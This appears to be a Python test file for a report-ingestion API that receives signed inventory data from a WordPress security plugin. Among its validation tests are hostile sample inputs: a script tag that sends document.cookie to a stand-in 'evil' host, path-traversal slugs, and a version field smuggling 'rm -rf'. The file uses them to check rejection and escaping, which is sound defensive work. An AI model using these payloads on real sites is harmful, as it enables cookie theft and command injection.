import time
from typing import Any

import pytest

from app.dashboard.routes import templates
from app.models import Report, Site, SiteComponent
from tests.api.conftest import Env
from tests.api.helpers import FakePlugin, body_of, report


def _send(env: Env, plugin: FakePlugin, data: dict[str, Any] | bytes, **kw: Any) -> int:
    body = data if isinstance(data, bytes) else body_of(data)
    return env.client.post(
        "/api/v1/report", content=body, headers=plugin.headers(body, **kw)
    ).status_code


def _components(env: Env) -> dict[str, SiteComponent]:
    with env.db() as s:
        return {c.component_key: c for c in s.query(SiteComponent).all()}


def _reports(env: Env) -> list[Report]:
    with env.db() as s:
        return s.query(Report).order_by(Report.id).all()


# --- Happy path -------------------------------------------------------------------------


def test_valid_report_is_stored_and_builds_inventory(env: Env, enrolled: FakePlugin) -> None:
    assert _send(env, enrolled, report()) == 204
    site = env.site()
    assert site.last_report_at is not None
    assert not site.suspicious

    comps = _components(env)
    assert comps["php"].version_raw == "8.3.30"
    assert comps["php"].distro == "upstream"
    assert comps["wordpress"].version_raw == "7.1.3"
    assert comps["wp-plugin:contact-form-7"].active is True
    assert comps["wp-plugin:hello-dolly"].active is False
    assert comps["wp-theme:twentytwentyfive"].version_raw == "1.5"
    assert comps["lib:openssl"].version_parsed == {"normalized": "3.0.13"}
    assert comps["server:apache"].version_parsed == {"normalized": "2.4.66"}
    assert comps["db:mariadb"].version_raw == "11.4.8"
    assert comps["os:debian"].version_raw == "13"
    assert comps["php-ext:imagick"].version_raw == "3.7.0"


def test_identical_report_is_not_stored_twice(env: Env, enrolled: FakePlugin) -> None:
    assert _send(env, enrolled, report()) == 204
    first_seen = env.site().last_report_at
    time.sleep(0.01)
    assert _send(env, enrolled, report()) == 204  # new generated_at, same content
    assert len(_reports(env)) == 1
    assert env.site().last_report_at > first_seen  # but "last seen" moves


def test_changed_report_updates_inventory(env: Env, enrolled: FakePlugin) -> None:
    assert _send(env, enrolled, report()) == 204
    patched = report()
    patched["php"] = {**patched["php"], "version": "8.3.36", "release": 36}
    patched["plugins"] = [p for p in patched["plugins"] if p["slug"] != "hello-dolly"]
    assert _send(env, enrolled, patched) == 204

    comps = _components(env)
    assert comps["php"].version_raw == "8.3.36"
    assert "wp-plugin:hello-dolly" not in comps  # uninstalled
    assert len(_reports(env)) == 2


# --- Authentication and replay -------------------------------------------------------


def test_bad_signature(env: Env, enrolled: FakePlugin) -> None:
    body = body_of(report())
    headers = enrolled.headers(body)
    tampered = body.replace(b"8.3.30", b"8.3.36")  # signed one body, sent another
    r = env.client.post("/api/v1/report", content=tampered, headers=headers)
    assert r.status_code == 401
    assert r.content == b""
    assert _reports(env) == []


def test_signed_by_a_different_key(env: Env, enrolled: FakePlugin) -> None:
    impostor = FakePlugin()
    body = body_of(report())
    headers = impostor.headers(body)
    headers["x-protect-key"] = enrolled.key_id  # claims to be the real site
    assert env.client.post("/api/v1/report", content=body, headers=headers).status_code == 401


def test_unknown_key(env: Env, enrolled: FakePlugin) -> None:
    assert _send(env, FakePlugin(), report()) == 401


def test_pending_site_cannot_report(env: Env, code: str, plugin: FakePlugin) -> None:
    assert _send(env, plugin, report()) == 401


def test_replayed_request_is_rejected(env: Env, enrolled: FakePlugin) -> None:
    body = body_of(report())
    headers = enrolled.headers(body)
    assert env.client.post("/api/v1/report", content=body, headers=headers).status_code == 204
    assert env.client.post("/api/v1/report", content=body, headers=headers).status_code == 401


@pytest.mark.parametrize("offset", [-700, 700, -86400])  # margin for slow test runs
def test_stale_or_future_timestamp(env: Env, enrolled: FakePlugin, offset: int) -> None:
    assert _send(env, enrolled, report(), ts=int(time.time()) + offset) == 401


def test_missing_headers(env: Env, enrolled: FakePlugin) -> None:
    body = body_of(report())
    assert env.client.post("/api/v1/report", content=body).status_code == 401


# --- Content rules -------------------------------------------------------------------


def test_oversized_body(env: Env, enrolled: FakePlugin) -> None:
    big = report()
    big["plugins"][0]["name"] = "x" * 200
    huge = body_of(big) + b" " * (256 * 1024)
    assert _send(env, enrolled, huge) == 413


def test_extra_top_level_field_rejected(env: Env, enrolled: FakePlugin) -> None:
    assert _send(env, enrolled, report(visitor_ips=["1.2.3.4"])) == 400


def test_extra_nested_field_rejected(env: Env, enrolled: FakePlugin) -> None:
    data = report()
    data["php"] = {**data["php"], "error_log": "/var/log/php.log"}
    assert _send(env, enrolled, data) == 400


def test_cli_sapi_rejected(env: Env, enrolled: FakePlugin) -> None:
    data = report()
    data["php"] = {**data["php"], "sapi": "cli"}
    assert _send(env, enrolled, data) == 400


@pytest.mark.parametrize(
    ("section", "bad"),
    [
        ("plugins", [{"slug": "../../etc", "version": "1.0", "active": True}]),
        ("plugins", [{"slug": "Contact Form", "version": "1.0", "active": True}]),
        ("plugins", [{"slug": "ok", "version": "1.0; rm -rf", "active": True}]),
        ("mu_plugins", [{"file": "/home/client/public_html/x.php"}]),
        ("mu_plugins", [{"file": "wp-content/../../x.php"}]),
    ],
)
def test_field_formats_enforced(env: Env, enrolled: FakePlugin, section: str, bad: Any) -> None:
    assert _send(env, enrolled, report(**{section: bad})) == 400


def test_absolute_path_in_checks_rejected(env: Env, enrolled: FakePlugin) -> None:
    data = report()
    data["checks"] = {**data["checks"], "uploads_php": ["/var/www/html/wp-content/uploads/a.php"]}
    assert _send(env, enrolled, data) == 400


def test_not_json(env: Env, enrolled: FakePlugin) -> None:
    assert _send(env, enrolled, b"<?php echo 1; ?>") == 400


# --- Hostile but valid content ---------------------------------------------------------


def test_script_in_plugin_name_is_stored_as_text_and_escaped(env: Env, enrolled: FakePlugin):
    evil = "<script>fetch('//evil/'+document.cookie)</script>"
    data = report()
    data["plugins"][0]["name"] = evil
    assert _send(env, enrolled, data) == 204
    stored = _reports(env)[-1].payload["plugins"][0]["name"]
    assert stored == evil  # kept verbatim, never "cleaned"
    html = templates.env.from_string("<td>{{ name }}</td>").render(name=stored)
    assert "<script>" not in html
    assert "&lt;script&gt;" in html


def test_control_characters_rejected(env: Env, enrolled: FakePlugin) -> None:
    data = report()
    data["plugins"][0]["name"] = "Evil\x00Name"
    assert _send(env, enrolled, data) == 400


# --- Odd reports get flagged, not rejected ---------------------------------------------


def test_php_downgrade_flags_site(env: Env, enrolled: FakePlugin) -> None:
    newer = report()
    newer["php"] = {**newer["php"], "version": "8.3.36", "release": 36}
    assert _send(env, enrolled, newer) == 204
    assert _send(env, enrolled, report()) == 204  # back to 8.3.30
    assert "php_version_went_down" in _reports(env)[-1].flags
    assert env.site().suspicious


def test_site_url_mismatch_flags_site(env: Env, enrolled: FakePlugin) -> None:
    assert _send(env, enrolled, report(site_url="https://staging-copy.example")) == 204
    assert "site_url_mismatch" in _reports(env)[-1].flags
    assert env.site().suspicious


def test_inconsistent_php_fields_flag_site(env: Env, enrolled: FakePlugin) -> None:
    data = report()
    data["php"] = {**data["php"], "release": 36}  # says 8.3.30 but release 36
    assert _send(env, enrolled, data) == 204
    assert "php_version_inconsistent" in _reports(env)[-1].flags


# --- Rate limiting and HTTPS --------------------------------------------------------------


def test_per_key_rate_limit(env: Env, enrolled: FakePlugin) -> None:
    limiter = env.client.app.state.limiters.per_key  # type: ignore[attr-defined]
    limiter.limit = 3
    codes = [_send(env, enrolled, report()) for _ in range(4)]
    assert codes == [204, 204, 204, 429]


def test_prod_requires_https(db_url: str) -> None:
    from fastapi.testclient import TestClient

    from app.main import create_app
    from app.settings import Settings

    app = create_app(
        Settings(env="prod", base_url="https://p.example", secret_key="x" * 40, database_url=db_url)
    )
    r = TestClient(app, base_url="http://p.example").post("/api/v1/report", content=b"{}")
    assert r.status_code == 400


def test_site_model_has_no_secret_columns() -> None:
    """Only public keys are stored; a stolen DB can't forge reports."""
    cols = {c.name for c in Site.__table__.columns}
    assert "public_key" in cols
    assert not {"private_key", "token", "secret", "password"} & cols
